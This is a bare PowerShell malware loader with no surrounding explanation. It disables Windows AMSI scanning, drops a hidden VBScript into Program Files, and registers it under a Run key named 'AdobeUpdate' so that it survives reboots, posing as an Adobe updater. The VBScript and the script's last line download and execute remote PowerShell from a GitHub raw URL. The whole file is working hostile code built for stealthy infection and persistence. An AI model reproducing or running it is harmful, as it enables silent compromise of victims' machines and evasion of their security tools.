[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) 
$VBS_file = @'
mycommand = "powershell -w hidden -ex bypass -c iex ((NeW-object net.wEbclient).downloadstring('https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib706.ps1'))"
CreateObject("Wscript.Shell").Run mycommand, 0, false   
'@

Start-Sleep -s 3
Set-Content -Path $env:ProgramFiles\cu.vbs -Value $VBS_file
attrib +h “$env:ProgramFiles\cu.vbs”
reg add “HKLM\Software\Microsoft\Windows\CurrentVersion\Run” /v AdobeUpdate /t REG_EXPAND_SZ /d “%ProgramFiles%\cu.vbs”

IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/Updater.ps1'))
